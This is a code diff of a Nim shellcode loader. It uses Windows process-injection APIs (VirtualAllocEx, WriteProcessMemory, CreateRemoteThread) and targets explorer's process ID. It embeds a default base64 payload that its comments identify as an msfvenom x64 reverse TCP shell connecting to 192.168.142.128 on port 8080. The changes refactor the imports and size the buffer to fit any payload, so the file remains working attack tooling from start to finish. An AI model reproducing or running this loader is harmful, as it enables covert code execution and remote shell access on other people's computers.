@@ -1,8 +1,15 @@
-import winim/lean, base64, osproc, winim/inc/psapi, unicode, strutils, strformat, os
-import winim/inc/tlhelp32
+import base64, osproc, unicode, strutils, strformat, os
+import parseopt
 import createSuspendedProcess
-import parseopt 
-
+import winim/inc/tlhelp32  # Full import for process enumeration
+from winim/lean import OpenProcess, VirtualAllocEx, WriteProcessMemory, 
+                      CreateRemoteThread, WaitForSingleObject, VirtualAlloc,
+                      EnumSystemGeoID, CloseHandle, HANDLE, DWORD, INVALID_HANDLE_VALUE,
+                      SIZE_T, LPTHREAD_START_ROUTINE, PAGE_EXECUTE_READWRITE,
+                      MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
+                      PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ,
+                      PROCESS_CREATE_THREAD, GEO_ENUMPROC, PAGE_EXECUTE_READ_WRITE,
+                      WAIT_OBJECT_0, WAIT_TIMEOUT, GetLastError, VirtualFreeEx
 proc getExplorerPID(): DWORD =
   var 
     processEntry: PROCESSENTRY32W
@@ -197,7 +204,9 @@ while true:
         echo "Unknown argument: ", p.key
         showHelp()
 
-# If no payload provided, use default: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.128 LPORT=8080 -f raw -o reverse.bin
+# this is msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.128 LPORT=8080 -f raw -o reverse.bin
+# cat reverse.bin | base64
+# Modify payload to be a copy of your base64 encoded shellcode
 if payload == "":
     payload = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
 yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
@@ -212,8 +221,10 @@ idr/1Q=="""
 let decodedData = decode(payload)
 echo "decoded:", decodedData
 echo decodedData.len
-var buf: array[1642, byte] #If you aren't using msfvenom payloads you will probably need to modify the size here
-copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
+var buf = newSeq[byte](decodedData.len)
+copyMem(addr buf[0], unsafeAddr decodedData[0], decodedData.len)
+#var buf: array[1642, byte] #If you aren't using msfvenom payloads you will probably need to modify the size here
+#copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
 
 # Process injection logic
 if executeMode:
